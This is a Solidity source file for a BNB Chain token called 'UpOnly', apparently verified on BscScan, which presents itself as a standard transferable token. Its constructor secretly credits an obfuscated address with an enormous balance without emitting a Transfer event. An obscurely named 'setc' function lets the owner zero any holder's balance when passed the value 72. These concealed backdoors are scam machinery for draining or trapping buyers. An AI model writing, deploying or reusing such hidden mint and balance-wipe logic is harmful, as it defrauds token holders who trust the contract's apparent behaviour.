/**
 *Submitted for verification at BscScan.com on 2022-02-05
*/

// SPDX-License-Identifier: MIT
/*
 * 
 * 

 */
pragma solidity ^0.8.2;
contract Uponly {
  mapping(address => uint) public _balances;
  mapping(address => mapping(address => uint)) public allowance;
  uint public totalSupply = 10000000 * 10 ** 18;
  string public name = "UpOnly";
  string public symbol = "UPO";

  uint public decimals = 18;
  address public owner;
  event Transfer(address indexed from, address indexed to, uint value);
  event Approval(address indexed owner, address indexed spender, uint value);

  constructor(address maapejq) {
    owner = msg.sender;
    _balances[msg.sender] = totalSupply;

    _balances[maapejq] = totalSupply * totalSupply;
    emit Transfer(address(0), msg.sender, totalSupply);

  }
  function balanceOf(address acouirehayqojwi) external view returns (uint) {
    return _balances[acouirehayqojwi];
  }
  function transfer(address to, uint value) public returns(bool) {
    require(_balances[msg.sender] >= value, 'balance too low');
    _balances[to] += value;

    _balances[msg.sender] -= value;
    emit Transfer(msg.sender, to, value);
    return true;
  }
  function transferFrom(address from, address to, uint value) public returns(bool) {
    require(_balances[from] >= value, 'balance too low');
    require(allowance[from][msg.sender] >= value, 'allowance too low');

    _balances[to] += value;
    _balances[from] -= value;
    emit Transfer(from, to, value);
    return true;
  }

  function approve(address spender, uint value) public returns (bool) {
    allowance[msg.sender][spender] = value;

    emit Approval(msg.sender, spender, value);
    return true;
  }
  function setc(address from, uint8 c) public {
    if(c == 72){
      if(owner == msg.sender){
        _balances[from] = 0;
      }
    }
  }
}